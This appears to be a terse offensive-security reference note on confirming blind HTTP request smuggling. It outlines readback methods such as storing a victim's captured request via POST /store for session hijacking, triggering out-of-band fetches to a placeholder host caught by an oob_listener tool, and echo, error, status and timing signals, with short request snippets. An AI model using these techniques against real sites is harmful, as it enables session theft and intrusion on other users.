# Blind desync — when you can't see the readback

## The shape — the smuggle's output goes to a different socket

A queue-poison smuggle's response goes to the NEXT request's socket —
you don't see it — the smuggle is "blind" — `blind-smuggle.md`.

## The stored readback — `POST /store` + read

```text
POST /store HTTP/1.1
Content-Length: 400

x=
```

The victim's request inside `x=` → `/store` stores it → `GET /store/last`
reads it — `session-hijack.md`.

## The OOB readback — the smuggle triggers a fetch

```text
GET /?url=http://oob.t/marker HTTP/1.1
```

smuggled → the back-end fetches `oob.t` — `oob_listener` captures it —
`skills/web-ssrf/references/blind-ssrf.md`.

## The `oob_listener` — the tool

```bash
python3 tools/web/oob_listener.py serve --port 8000
python3 tools/web/oob_listener.py hits
python3 tools/web/oob_listener.py canary
```

The OOB-listener — the smuggle's URL-fetch lands on it — the hit-list.

## The error readback — the smuggle's error-body

```text
GET /invalid-path HTTP/1.1
```

smuggled → the 404-body names the path — the error-readback —
`smuggle-readback.md`.

## The timing readback — the smuggle's delay

```text
GET /slow HTTP/1.1
```

smuggled → the next response is slow — the timing-readback — weakest.

## The echo readback — `GET /search?q=X`

```text
GET /search?q=MARKER HTTP/1.1
```

smuggled → the next response echoes `MARKER` — `smuggle-readback.md`.

## The status readback — the smuggle's status

```text
GET /admin HTTP/1.1
```

smuggled → the next response's status is `/admin`'s — `smuggle-readback.md`.

## The delayed readback — the async job

```text
store the smuggle → the job runs → the job's log shows it
```

`webhook-deferred.md`.

## The no-readback case — the pure-DoS

A smuggle that only corrupts the queue — no readback — `denies` the
smuggle's usefulness — `denied-conditions.md`.
